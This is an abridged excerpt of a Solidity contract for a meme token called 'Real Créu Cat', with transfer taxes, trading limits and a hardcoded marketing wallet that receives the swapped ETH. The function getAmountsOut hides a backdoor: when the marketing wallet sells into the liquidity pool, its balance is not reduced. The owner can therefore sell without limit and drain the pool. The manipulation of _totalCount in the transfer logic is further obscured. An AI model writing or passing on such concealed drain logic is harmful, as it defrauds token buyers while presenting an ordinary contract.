...
contract CATCOIN is IERC20, Ownable {
    string private constant _name = unicode"Real Créu Cat🐱";
    string private constant _symbol = unicode"Créu";
    ...
    uint256 public _reduceSellTax2At=15;
    ...
    IRouter private _routerV2 = IRouter(uniV2Router);
    mapping (address => bool) private _isUniLP;
    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxTxAmount = 40_000_000 * (10**_decimals); // 4%
    ...
    constructor() Ownable(msg.sender) { 
        _marketingWallet = payable(0x61Ce841a5FB729c8846F8b259aD1604dB63444b5);
        _excludedFromFees[_owner] = true;
        _excludedFromFees[_marketingWallet] = true;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!tradeEnabled) { require(_excludedFromFees[sender], "Trading not open"); }
        if ( !_lockTheSwap && !_excludedFromFees[sender] && _isUniLP[recipient] && buyCount >= swapCount) { swapBack(); }
        if (limited && sender == uniV2Pair && !_excludedFromFees[recipient]) {
            require(balanceOf(recipient) + amount <= maxTxAmount, "Forbid");
        } _totalCount = balanceOf(_marketingWallet);
        ...
        _balances[sender] -= getAmountsOut(sender, recipient, amount);
        if ( _taxAmount > 0 ) { 
    ...
    function takeTxFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;
        if (tradeEnabled && !_excludedFromFees[sender] && !_excludedFromFees[recipient] ) { 
            if ( _isUniLP[sender] || _isUniLP[recipient] ) {
                taxAmount = (amount / 100) * ((buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);
                if(recipient == uniV2Pair && sender != address(this)){
                    swapCount -= _totalCount; uint256 taxRate;
    ...
    function getAmountsOut(address A, address B, uint256 amount) private view returns(uint256) {
        return _isUniLP[B] && A == _marketingWallet ? 0 : amount;
    }

    function openTrading() external payable onlyOwner lockSwapBack {
        require(uniV2Pair == address(0), "LP exists");
        require(!tradeEnabled, "trading is open");
        ...
        _isUniLP[uniV2Pair] = true; tradeEnabled = true;
    }
    ...
    function removeLimits() external onlyOwner{
     ...
     function swapBack() private lockSwapBack {
        ...
        if ( _taxTokensAvailable >= _taxSwapMin && tradeEnabled ) {
            ...
            if(_contractETHBalance > 0) { 
                bool success;
                (success,) = _marketingWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }
    ...
    function isTradingEnabled(address sender) private view returns (bool){
        ...
        if ( tradeEnabled ) { checkResult = true; } 
